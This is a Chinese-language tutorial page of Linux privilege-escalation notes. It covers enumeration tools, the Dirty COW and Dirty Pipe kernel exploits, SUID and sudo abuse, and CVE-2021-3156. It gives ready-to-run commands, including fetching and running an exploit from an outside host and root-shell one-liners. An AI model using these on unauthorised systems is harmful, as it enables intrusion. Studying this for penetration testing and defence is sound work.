+<p>Getshell/LinuxTQ: &#x300A;Linux&#x63D0;&#x6743;&#x65B9;&#x6CD5;&#x8BBA;&#x300B;
+<a href="https://github.com/Getshell/LinuxTQ" target="_blank">https://github.com/Getshell/LinuxTQ</a></p>
+<h2 id="&#x8F85;&#x52A9;&#x5DE5;&#x5177;">&#x8F85;&#x52A9;&#x5DE5;&#x5177;</h2>
+<h3 id="gtfobins"><strong><a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a></strong></h3>
+<p>GTFOBins&#x662F;&#x4E00;&#x4E2A;&#x7CBE;&#x5FC3;&#x7B56;&#x5212;&#x7684;Unix&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x5217;&#x8868;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x7ED5;&#x8FC7;&#x9519;&#x8BEF;&#x914D;&#x7F6E;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x672C;&#x5730;&#x5B89;&#x5168;&#x9650;&#x5236;&#x3002;&#x8BE5;&#x9879;&#x76EE;&#x6536;&#x96C6;&#x4E86;Unix&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x7684;&#x5408;&#x6CD5;&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x4E9B;&#x51FD;&#x6570;&#x53EF;&#x80FD;&#x88AB;&#x6EE5;&#x7528;&#xFF0C;&#x4EE5;&#x6253;&#x7834;&#x53D7;&#x9650;&#x5236;&#x7684;shell&#xFF0C;&#x5347;&#x7EA7;&#x6216;&#x7EF4;&#x62A4;&#x63D0;&#x5347;&#x7684;&#x7279;&#x6743;&#xFF0C;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#xFF0C;&#x751F;&#x6210;&#x7ED1;&#x5B9A;&#x548C;&#x53CD;&#x5411;shell&#xFF0C;&#x5E76;&#x4E3A;&#x5176;&#x4ED6;&#x4E8B;&#x540E;&#x5229;&#x7528;&#x4EFB;&#x52A1;&#x63D0;&#x4F9B;&#x4FBF;&#x5229;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x6F0F;&#x6D1E;&#x5217;&#x8868;&#xFF0C;&#x8FD9;&#x91CC;&#x5217;&#x51FA;&#x7684;&#x7A0B;&#x5E8F;&#x672C;&#x8EAB;&#x5E76;&#x4E0D;&#x5BB9;&#x6613;&#x53D7;&#x5230;&#x653B;&#x51FB;&#xFF0C;&#x76F8;&#x53CD;&#xFF0C;<strong>GTFOBins&#x662F;&#x4E00;&#x4E2A;&#x6982;&#x8981;&#xFF0C;&#x8BF4;&#x660E;&#x5F53;&#x60A8;&#x53EA;&#x6709;&#x67D0;&#x4E9B;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x53EF;&#x7528;&#x65F6;&#xFF0C;&#x5982;&#x4F55;&#x83B7;&#x5F97;root&#x6743;&#x9650;</strong>&#x3002;</p>
+<h3 id="beroot"><strong>beroot</strong></h3>
+<p>BeRoot&#x7528;&#x4E8E;&#x68C0;&#x67E5;Linux&#x548C;Mac OS&#x4E0A;&#x5E38;&#x89C1;&#x7684;&#x9519;&#x8BEF;&#x914D;&#x7F6E;&#xFF0C;&#x4EE5;&#x627E;&#x5230;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x6765;&#x5347;&#x7EA7;&#x6211;&#x4EEC;&#x7684;&#x7279;&#x6743;&#x3002;&#x68C0;&#x67E5;&#x9879;&#x5305;&#x62EC;GTFOBins&#x4E2D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x3001;&#x901A;&#x914D;&#x7B26;&#x9519;&#x8BEF;&#x3001;suid&#x3001;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3001;NFS&#x3001;sudo&#x7B49;&#x7B49;</p>
+<pre class="language-"><code class="lang-bash">python2 beroot.py
+</code></pre>
+<p><img src="../images/image-20231015201659431.png" alt="image-20231015201659431"></p>
+<p><img src="../images/image-20231015201711821.png" alt="image-20231015201711821"></p>
+<p><img src="../images/image-20231015201721586.png" alt="image-20231015201721586"></p>
+<h3 id="linepeas--&#x4E0D;&#x53EA;&#x662F;&#x63D0;&#x6743;"><strong>Linepeas--&#x4E0D;&#x53EA;&#x662F;&#x63D0;&#x6743;</strong></h3>
+<p>LinPEAS &#x662F;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x7528;&#x4E8E;&#x641C;&#x7D22;&#x5728; Linux/Unix*/MacOS &#x4E3B;&#x673A;&#x4E0A;&#x63D0;&#x5347;&#x6743;&#x9650;&#x7684;&#x53EF;&#x80FD;&#x8DEF;&#x5F84;&#x3002;<a href="https://github.com/peass-ng" target="_blank">https://github.com/peass-ng</a></p>
+<pre class="language-"><code>wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/linpeas.sh
+</code></pre><p>&#x53EF;&#x5C1D;&#x8BD5;&#x5229;&#x7528;&#x7684;&#x7ED3;&#x679C;&#x989C;&#x8272;&#xFF0C;&#x7EA2;&#x5B57;&#x9EC4;&#x5E95;&#xFF08;99% sure&#xFF09;&#x548C;&#x7EA2;&#x5B57;</p>
+<p><img src="../../source/images/image-20241119234337800.png" alt="image-20241119234337800"></p>
+<p>&#x53C2;&#x6570;&#x9009;&#x9879;</p>
+<pre class="language-"><code class="lang-shell"><span class="token parameter variable">-o</span> <span class="token punctuation">(</span>&#x4EC5;&#x6267;&#x884C;&#x9009;&#x5B9A;&#x7684;&#x68C0;&#x67E5;<span class="token punctuation">)</span>&#xFF1A;
+&#x4EC5;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x68C0;&#x67E5;&#x9879;&#x76EE;&#x3002;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x591A;&#x4E2A;&#x9879;&#x76EE;&#xFF0C;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;&#x3002;
+&#x4F8B;&#x5982;&#xFF1A;-o system_information,procs_crons_timers_srvcs_sockets,interesting_files
+&#x53EF;&#x9009;&#x7684;&#x68C0;&#x67E5;&#x9879;&#x76EE;&#x5305;&#x62EC;&#xFF1A;
+system_information&#xFF1A;&#x7CFB;&#x7EDF;&#x4FE1;&#x606F;
+container&#xFF1A;&#x5BB9;&#x5668;
+cloud&#xFF1A;&#x4E91;&#x73AF;&#x5883;
+procs_crons_timers_srvcs_sockets&#xFF1A;&#x8FDB;&#x7A0B;&#x3001;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#x3001;&#x5B9A;&#x65F6;&#x5668;&#x3001;&#x670D;&#x52A1;&#x3001;&#x5957;&#x63A5;&#x5B57;
+network_information&#xFF1A;&#x7F51;&#x7EDC;&#x4FE1;&#x606F;
+users_information&#xFF1A;&#x7528;&#x6237;&#x4FE1;&#x606F;
+software_information&#xFF1A;&#x8F6F;&#x4EF6;&#x4FE1;&#x606F;
+interesting_files&#xFF1A;&#x6709;&#x8DA3;&#x7684;&#x6587;&#x4EF6;
+api_keys_regex&#xFF1A;API &#x5BC6;&#x94A5;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;
+
+<span class="token parameter variable">-r</span> <span class="token punctuation">(</span>&#x542F;&#x7528;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x68C0;&#x67E5;<span class="token punctuation">)</span>&#xFF1A;
+&#x542F;&#x7528;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x68C0;&#x67E5;&#xFF0C;&#x8FD9;&#x53EF;&#x80FD;&#x4F1A;&#x82B1;&#x8D39;&#x51E0;&#x5206;&#x949F;&#x5230;&#x51E0;&#x5C0F;&#x65F6;&#x7684;&#x65F6;&#x95F4;&#x3002;
+
+<span class="token parameter variable">-P</span> <span class="token punctuation">(</span>&#x6307;&#x5B9A;&#x5BC6;&#x7801;<span class="token punctuation">)</span>&#xFF1A;
+&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x5BC6;&#x7801;&#xFF0C;&#x7528;&#x4E8E;&#x8FD0;&#x884C; <span class="token function">sudo</span> <span class="token parameter variable">-l</span> &#x548C;&#x901A;&#x8FC7; <span class="token function">su</span> &#x66B4;&#x529B;&#x7834;&#x89E3;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x8D26;&#x6237;&#x3002;
+
+<span class="token parameter variable">-N</span> <span class="token punctuation">(</span>&#x4E0D;&#x4F7F;&#x7528;&#x989C;&#x8272;<span class="token punctuation">)</span>&#xFF1A;
+&#x4E0D;&#x4F7F;&#x7528;&#x989C;&#x8272;&#x9AD8;&#x4EAE;&#x663E;&#x793A;&#x7ED3;&#x679C;&#x3002;
+
+
+&#x7F51;&#x7EDC;&#x4FA6;&#x5BDF;
+<span class="token parameter variable">-t</span> <span class="token punctuation">(</span>&#x81EA;&#x52A8;&#x7F51;&#x7EDC;&#x626B;&#x63CF;&#x548C;&#x4E92;&#x8054;&#x7F51;&#x8FDE;&#x63A5;&#x68C0;&#x67E5;<span class="token punctuation">)</span>&#xFF1A;
+&#x81EA;&#x52A8;&#x8FDB;&#x884C;&#x7F51;&#x7EDC;&#x626B;&#x63CF;&#x548C;&#x4E92;&#x8054;&#x7F51;&#x8FDE;&#x63A5;&#x68C0;&#x67E5;&#xFF0C;&#x5E76;&#x5C06;&#x7ED3;&#x679C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x3002;
+
+<span class="token parameter variable">-d</span> <span class="token punctuation">(</span>&#x53D1;&#x73B0;&#x4E3B;&#x673A;<span class="token punctuation">)</span>&#xFF1A;
+&#x4F7F;&#x7528; fping &#x6216; <span class="token function">ping</span> &#x53D1;&#x73B0;&#x6307;&#x5B9A;&#x7F51;&#x6BB5;&#x5185;&#x7684;&#x4E3B;&#x673A;&#x3002;
+&#x4F8B;&#x5982;&#xFF1A;-d <span class="token number">192.168</span>.0.1/24
+
+<span class="token parameter variable">-p</span> <span class="token punctuation">(</span>&#x53D1;&#x73B0;&#x5F00;&#x653E;&#x7AEF;&#x53E3;<span class="token punctuation">)</span>&#xFF1A;
+&#x7ED3;&#x5408; <span class="token parameter variable">-d</span> &#x9009;&#x9879;&#xFF0C;&#x53D1;&#x73B0;&#x6307;&#x5B9A;&#x7F51;&#x6BB5;&#x5185;&#x4E3B;&#x673A;&#x7684;&#x5F00;&#x653E;&#x7AEF;&#x53E3;&#x3002;
+&#x9ED8;&#x8BA4;&#x626B;&#x63CF;&#x7AEF;&#x53E3; <span class="token number">22</span>, <span class="token number">80</span>, <span class="token number">443</span>, <span class="token number">445</span>, <span class="token number">3389</span>&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5176;&#x4ED6;&#x7AEF;&#x53E3;&#x3002;
+&#x4F8B;&#x5982;&#xFF1A;-d <span class="token number">192.168</span>.0.1/24 <span class="token parameter variable">-p</span> <span class="token number">53,139</span>
+
+<span class="token parameter variable">-i</span> <span class="token punctuation">(</span>&#x626B;&#x63CF;&#x5355;&#x4E2A;IP<span class="token punctuation">)</span>&#xFF1A;
+&#x4F7F;&#x7528; <span class="token function">nc</span> &#x626B;&#x63CF;&#x6307;&#x5B9A;&#x7684;&#x5355;&#x4E2A;IP&#x5730;&#x5740;&#x3002;
+&#x9ED8;&#x8BA4;&#x626B;&#x63CF; nmap &#x7684;&#x524D;1000&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5176;&#x4ED6;&#x7AEF;&#x53E3;&#x3002;
+&#x4F8B;&#x5982;&#xFF1A;-i <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-p</span> <span class="token number">53,80</span>,443,8000,8080
+&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;
+
+<span class="token parameter variable">-F</span> <span class="token punctuation">(</span>&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;<span class="token punctuation">)</span>&#xFF1A;
+&#x5C06;&#x672C;&#x5730;IP&#x548C;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x5230;&#x8FDC;&#x7A0B;IP&#x548C;&#x7AEF;&#x53E3;&#x3002;
+&#x4F8B;&#x5982;&#xFF1A;-F <span class="token number">127.0</span>.0.1:8080:192.168.1.1:80
+</code></pre>
+<h3 id="pspy--&#x8FDB;&#x7A0B;&#x76D1;&#x63A7;"><strong>pspy</strong>--&#x8FDB;&#x7A0B;&#x76D1;&#x63A7;</h3>
+<p>Pspy&#x662F;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x7528;&#x4E8E;&#x5728;&#x4E0D;&#x9700;&#x8981;root&#x6743;&#x9650;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x7AA5;&#x63A2;&#x8FDB;&#x7A0B;&#x3002;&#x8BE5;&#x5DE5;&#x5177;&#x901A;&#x5173;&#x5FAA;&#x73AF;&#x904D;&#x5386;/proc&#x4E0B;&#x7684;&#x503C;&#x6765;&#x83B7;&#x53D6;&#x8FDB;&#x7A0B;&#x53C2;&#x6570;&#x4FE1;&#x606F;&#x3002;&#x6BD4;&#x5982;&#x8BF4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x4E00;&#x4E9B;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;&#x8FDB;&#x7A0B;&#x6216;&#x5176;&#x4ED6;&#x53EF;&#x7591;&#x8FDB;&#x7A0B;&#x6765;&#x5C1D;&#x8BD5;&#x63D0;&#x6743;</p>
+<pre class="language-"><code class="lang-bash">./pspy64
+</code></pre>
+<p><img src="../images/image-20231015201909328.png" alt="image-20231015201909328"></p>
+<h3 id="traior--&#x81EA;&#x52A8;&#x5316;&#x63D0;&#x6743;&#x1F402;">traior--&#x81EA;&#x52A8;&#x5316;&#x63D0;&#x6743;&#x1F402;</h3>
+<p>&#x591A;&#x4E2A;linux&#x63D0;&#x6743;&#x6F0F;&#x6D1E;&#x7F1D;&#x5408;&#x602A;&#xFF0C;&#x8FD0;&#x884C;&#x540E;&#x4F1A;&#x7ED9;&#x51FA;&#x63D0;&#x6743;&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x5185;&#x7F6E;&#x4E86;exp&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;</p>
+<p><img src="../images/image-20231015202209167.png" alt="image-20231015202209167"></p>
+<p><img src="../images/image-20231015202355175.png" alt="image-20231015202355175"></p>
+<p><img src="../images/image-20231015202422512.png" alt="image-20231015202422512"></p>
+<h2 id="&#x5E38;&#x89C1;&#x63D0;&#x6743;&#x624B;&#x6CD5;">&#x5E38;&#x89C1;&#x63D0;&#x6743;&#x624B;&#x6CD5;</h2>
+<h3 id="&#x5185;&#x6838;&#x63D0;&#x6743;">&#x5185;&#x6838;&#x63D0;&#x6743;</h3>
+<p>&#x5F3A;&#x8C03;&#x5229;&#x7528;&#x5185;&#x6838;&#x6F0F;&#x6D1E;&#x7684;&#x51E0;&#x4E2A;<strong>&#x6CE8;&#x610F;&#x70B9;</strong>&#xFF1A;</p>
+<ol>
+<li>&#x8BFB;&#x6E90;&#x7801;&#x6CE8;&#x91CA;&#xFF0C;&#x6709;exp&#x57FA;&#x672C;&#x4FE1;&#x606F;&#x548C;&#x7F16;&#x8BD1;&#x65B9;&#x6CD5;&#xFF0C;&#x4E0D;&#x7136;&#x53EF;&#x80FD;&#x8FDE;&#x7F16;&#x8BD1;&#x90FD;&#x4E0D;&#x4F1A;</li>
+<li>&#x8BFB;&#x6E90;&#x7801;&#xFF0C;&#x4E0D;&#x7136;&#x8D39;&#x52B2;&#x7F16;&#x8BD1;&#x5B8C;&#x624D;&#x53D1;&#x73B0;&#x4E0D;&#x9002;&#x7528;</li>
+<li>&#x8BFB;&#x6E90;&#x7801;&#xFF0C;&#x4E0D;&#x7136;&#x9047;&#x5230;&#x4E00;&#x4E2A;&#x5220;&#x5168;&#x76D8;&#x7684;&#x201D;exp&#x201C;&#x600E;&#x4E48;&#x529E;</li>
+<li><p>&#x9047;&#x5230;&#x6CA1;&#x6709;gcc&#x7684;&#x5751;&#x7239;&#x670D;&#x52A1;&#x5668;&#x3002;&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x5728;&#x672C;&#x5730;&#x7F16;&#x8BD1;&#x3002;&#x672C;&#x5730;&#x7F16;&#x8BD1;&#x65F6;&#x4E0D;&#x6B62;&#x8981;&#x770B;exp&#x6E90;&#x7801;&#x6CE8;&#x91CA;&#x7684;&#x7F16;&#x8BD1;&#x53C2;&#x6570;&#xFF0C;&#x4E5F;&#x9700;&#x8981;&#x624B;&#x52A8;&#x8C03;&#x6574;&#x4E00;&#x4E0B;&#x7F16;&#x8BD1;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x6BD4;&#x5982;&#x7ED9;gcc &#x52A0;-m 32&#x6765;&#x7F16;&#x8BD1;32&#x4F4D;&#x3002;&#x7F16;&#x8BD1;&#x95EE;&#x9898;&#x7E41;&#x591A;&#xFF0C;&#x6709;&#x56F0;&#x96BE;&#x627E;&#x8C37;&#x6B4C;&#x3002;</p>
+</li>
+<li><p><strong>&#x810F;&#x725B;&#x6F0F;&#x6D1E;&#xFF08;CVE-2016-5195&#xFF09;</strong></p>
+<blockquote>
+<p>&#x6F0F;&#x6D1E;&#x539F;&#x7406;&#xFF1A;&#x8BE5;&#x6F0F;&#x6D1E;&#x5177;&#x4F53;&#x4E3A;&#xFF0C;get_user_page&#x5185;&#x6838;&#x51FD;&#x6570;&#x5728;&#x5904;&#x7406;<strong>Copy-on-Write</strong>(&#x4EE5;&#x4E0B;&#x4F7F;&#x7528;COW&#x8868;&#x793A;)&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x53EF;&#x80FD;&#x4EA7;&#x51FA;&#x7ADE;&#x6001;&#x6761;&#x4EF6;&#x9020;&#x6210;COW&#x8FC7;&#x7A0B;&#x88AB;&#x7834;&#x574F;&#xFF0C;&#x5BFC;&#x81F4;&#x51FA;&#x73B0;&#x5199;&#x6570;&#x636E;&#x5230;&#x8FDB;&#x7A0B;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x5185;&#x53EA;&#x8BFB;&#x5185;&#x5B58;&#x533A;&#x57DF;&#x7684;&#x673A;&#x4F1A;&#x3002;<strong>&#x4FEE;&#x6539;su&#x6216;&#x8005;passwd&#x7A0B;&#x5E8F;</strong>&#x5C31;&#x53EF;&#x4EE5;&#x8FBE;&#x5230;root&#x7684;&#x76EE;&#x7684;&#x3002;</p>
+</blockquote>
+<p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank">PoCs &#xB7; dirtycow/dirtycow.github.io Wiki</a></p>
+</li>
+<li><p><strong>Dirty Pipe(CVE-2022-0847)</strong></p>
+<ul>
+<li><p><a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit" target="_blank">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p>
+<p>&#x8986;&#x76D6; /etc/passwd &#x4E2D;&#x7684; root &#x5BC6;&#x7801;&#x5B57;&#x6BB5;&#x5E76;&#x5728;&#x5F39;&#x51FA; root shell &#x540E;&#x6062;&#x590D;</p>
+</li>
+<li><p><a href="https://haxx.in/files/dirtypipez.c" target="_blank">https://haxx.in/files/dirtypipez.c</a></p>
+<p>&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x4E00;&#x4E2A;&#x5177;&#x6709;suid&#x6743;&#x9650;&#x7684;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x63D0;&#x6743;&#xFF0C;&#x5B8C;&#x6210;&#x63D0;&#x6743;&#x540E;&#x518D;&#x628A;&#x6587;&#x4EF6;&#x6539;&#x56DE;&#x6765;</p>
+<pre class="language-"><code class="lang-bash"><span class="token function">wget</span> https://haxx.in/files/dirtypipez.c
+gcc <span class="token parameter variable">-o</span> dirtypipez dirtypipez.c
+./dirtypipez /usr/bin/su  <span class="token comment">#&#x4EFB;&#x4F55;&#x5177;&#x4F53;suid&#x6743;&#x9650;&#x7684;&#x6587;&#x4EF6;&#x5747;&#x53EF;</span>
+</code></pre>
+<p><img src="../images/image-20231015204347541.png" alt="image-20231015204347541"></p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="docker&#x63D0;&#x6743;">Docker&#x63D0;&#x6743;</h3>
+<ul>
+<li><p>&#x4ECE;&#x810F;&#x7BA1;&#x9053;&#xFF08;CVE-2022-0847&#xFF09;&#x5230; Docker &#x9003;&#x9038;</p>
+<p><img src="../images/image-20231015202422512.png?lastModify=1697447453" alt="image-20231015202422512"></p>
+</li>
+<li><p>CVE-2022-23222--&#x4E0D;&#x7A33;&#x5B9A;</p>
+<p>&#x5F71;&#x54CD;&#x7248;&#x672C;&#xFF1A;5.8.0 &lt;= Linux &#x5185;&#x6838; &lt;= 5.16</p>
+<p><a href="https://github.com/tr3ee/CVE-2022-23222.git" target="_blank">https://github.com/tr3ee/CVE-2022-23222.git</a></p>
+</li>
+<li><p>Docker &#x7528;&#x6237;&#x7EC4;&#x63D0;&#x6743;</p>
+<p><a href="http://124.220.192.120:7777/CloudNative/Docker/docker-user-group-privilege-escalation.html" target="_blank">Docker &#x7528;&#x6237;&#x7EC4;&#x63D0;&#x6743; | T Wiki</a></p>
+</li>
+</ul>
+<h3 id="suid&#x63D0;&#x6743;">suid&#x63D0;&#x6743;</h3>
+<p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank">&#x8C08;&#x4E00;&#x8C08;Linux&#x4E0E;suid&#x63D0;&#x6743; | &#x79BB;&#x522B;&#x6B4C; (leavesongs.com)</a></p>
+<p><img src="../images/image-20230220142509956.png" alt="image-20230220142509956"></p>
+<blockquote>
+<p>suid&#x5168;&#x79F0;&#x662F;<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution&#x3002;&#x8FD9;&#x662F;Linux&#x7ED9;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x7684;&#x4E00;&#x4E2A;&#x5C5E;&#x6027;&#x3002;</p>
+<p>&#x8BBE;&#x7F6E;&#x4E86;s&#x4F4D;&#x7684;&#x7A0B;&#x5E8F;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#xFF0C;&#x5176;<strong>Effective UID</strong>&#x5C06;&#x4F1A;&#x8BBE;&#x7F6E;&#x4E3A;&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;&#x7684;&#x6240;&#x6709;&#x8005;&#x3002;&#x6BD4;&#x5982;&#xFF0C;<code>/bin/ping</code>&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;&#x7684;&#x6240;&#x6709;&#x8005;&#x662F;0&#xFF08;root&#xFF09;&#xFF0C;&#x5B83;&#x8BBE;&#x7F6E;&#x4E86;s&#x4F4D;&#xFF0C;&#x90A3;&#x4E48;&#x666E;&#x901A;&#x7528;&#x6237;&#x5728;&#x8FD0;&#x884C;ping&#x65F6;&#x5176;<strong>Effective UID</strong>&#x5C31;&#x662F;0&#xFF0C;&#x7B49;&#x540C;&#x4E8E;&#x62E5;&#x6709;&#x4E86;root&#x6743;&#x9650;&#x3002;</p>
+</blockquote>
+<p><img src="../images/image-20230220142233418.png" alt="image-20230220142233418"></p>
+<p>&#x67E5;&#x627E;&#x5177;&#x6709;s&#x4F4D;&#x6743;&#x9650;&#x7684;&#x547D;&#x4EE4;</p>
+<pre class="language-"><code class="lang-shell"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
+<span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
+<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-ldb</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">;</span>
+</code></pre>
+<p>&#x5E38;&#x89C1;suid&#x63D0;&#x6743;&#x547D;&#x4EE4;</p>
+<pre class="language-"><code class="lang-shell"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token builtin class-name">command</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>
+</code></pre>
+<pre class="language-"><code>./vim -c &apos;:python3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&apos;
+</code></pre><h3 id="sudo&#x63D0;&#x6743;">sudo&#x63D0;&#x6743;</h3>
+<blockquote>
+<p>sudo&#xFF1A;super user do</p>
+</blockquote>
+<h4 id="&#x4E0D;&#x6070;&#x5F53;&#x7684;sudo&#x547D;&#x4EE4;&#x914D;&#x7F6E;">&#x4E0D;&#x6070;&#x5F53;&#x7684;sudo&#x547D;&#x4EE4;&#x914D;&#x7F6E;</h4>
+<p>&#x539F;&#x7406;&#xFF1A;</p>
+<p>&#x5728;<strong>&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;</strong>&#x4EE5;&#x53CA;<strong>&#x65E0;&#x5BC6;&#x7801;</strong>&#x60C5;&#x51B5;&#x4E0B;&#xFF08;&#x77E5;&#x9053;&#x5BC6;&#x7801;&#x76F4;&#x63A5;&#x5207;&#x6362;&#x4E3A;root&#x7528;&#x6237;&#x5C31;&#x597D;&#x4E86;&#xFF09;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>sudo -l</code>&#x67E5;&#x627E;&#x54EA;&#x4E9B;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x4EE5;root&#x6743;&#x9650;&#x6267;&#x884C;&#xFF0C;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x547D;&#x4EE4;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;shell&#x5373;&#x53EF;&#x63D0;&#x6743;</p>
+<p><img src="../images/image-20230220161114377.png" alt="image-20230220161114377"></p>
+<p><img src="../images/image-20230220161140688.png" alt="image-20230220161140688"></p>
+<p>&#x5728;vi&#x7684;ESC&#x6A21;&#x5F0F;&#x4E0B;&#x8F93;&#x5165;<code>!/bin/bash</code>&#x540E;&#x6309;&#x4E0B;&#x56DE;&#x8F66;&#x5373;&#x53EF;&#x53D8;&#x4E3A;root&#x6743;&#x9650;&#x3002;</p>
+<h4 id="linux-sudo&#x6743;&#x9650;&#x63D0;&#x5347;&#x6F0F;&#x6D1E;&#xFF08;cve-2021-3156&#xFF09;---&#x6210;&#x529F;&#x7387;&#x9AD8;">Linux sudo&#x6743;&#x9650;&#x63D0;&#x5347;&#x6F0F;&#x6D1E;&#xFF08;CVE-2021-3156&#xFF09;-- &#x6210;&#x529F;&#x7387;&#x9AD8;</h4>
+<p><strong>&#x67E5;&#x770B;sudo&#x7248;&#x672C;</strong></p>
+<pre class="language-"><code class="lang-bash"><span class="token function">sudo</span> <span class="token parameter variable">--version</span>
+</code></pre>
+<p><strong>&#x7248;&#x672C;&#x5F71;&#x54CD;</strong></p>
+<ul>
+<li><p>sudo 1.8.2 - 1.8.31p2</p>
+</li>
+<li><p>sudo 1.9.0 - 1.9.5p1</p>
+</li>
+</ul>
+<p><strong>&#x7B80;&#x5355;&#x5224;&#x65AD;&#x65B9;&#x6CD5;</strong></p>
+<pre class="language-"><code class="lang-bash">sudoedit <span class="token parameter variable">-s</span> /
+</code></pre>
+<blockquote>
+<p>&#x5982;&#x679C;&#x663E;&#x793A;sudoedit: /: not a regular file&#xFF0C;&#x5219;&#x8868;&#x793A;&#x8BE5;&#x6F0F;&#x6D1E;&#x5B58;&#x5728;</p>
+</blockquote>
+<p><strong>EXP&#x4F7F;&#x7528;</strong></p>
+<p><a href="https://github.com/worawit/CVE-2021-3156" target="_blank">https://github.com/worawit/CVE-2021-3156</a></p>
+<ul>
+<li><p>&#x5BF9;&#x4E8E; glibc &#x652F;&#x6301;&#x5E76;&#x542F;&#x7528;&#x4E86; tcache &#x7684; Linux &#x53D1;&#x884C;&#x7248;&#xFF08;CentOS 8&#x3001;Ubuntu &gt;= 17.10&#x3001;Debian 10&#xFF09;</p>
+<p>exploit_nss.py&#x2192;exploit_timestamp_race.c</p>
+</li>
+<li><p>&#x5BF9;&#x4E8E; glibc &#x4E0D;&#x652F;&#x6301; tcache &#x7684; Linux &#x53D1;&#x884C;&#x7248;&#xFF08;Debian 9, Ubuntu 16.04, or Ubuntu 14.04&#xFF09;</p>
+<p>exploit_nss_xxx.py&#x2192;exploit_defaults_mailer.py&#x2192;exploit_userspec.py</p>
+</li>
+</ul>
+<p><a href="https://github.com/blasty/CVE-2021-3156" target="_blank">blasty/CVE-2021-3156 (github.com)</a></p>
+<pre class="language-"><code class="lang-bash"><span class="token function">make</span>
+./sudo-hax-me-a-sandwich num <span class="token comment"># &#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;&#x5E8F;&#x53F7;</span>
+</code></pre>
+<p><img src="../images/image-20231015214211618.png" alt="image-20231015214211618"></p>
